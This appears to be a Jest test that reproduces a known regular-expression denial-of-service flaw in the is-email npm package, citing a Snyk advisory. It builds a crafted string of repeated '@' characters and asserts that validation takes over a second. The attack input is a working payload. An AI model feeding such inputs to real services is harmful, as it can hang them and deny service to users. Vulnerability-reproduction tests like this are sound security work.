//https://snyk.io/vuln/SNYK-JS-ISEMAIL-1279002
test("ReDos in is-email", () => {
  const genstr = require("./utils").genstr;
  const measureTime = require("./utils").measureTime;
  const isEmail = require("is-email");

  let attack_str = "" + genstr(3000, "@") + "!"; //build_blank(5000);

  let t = measureTime(function () {
    isEmail(attack_str);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
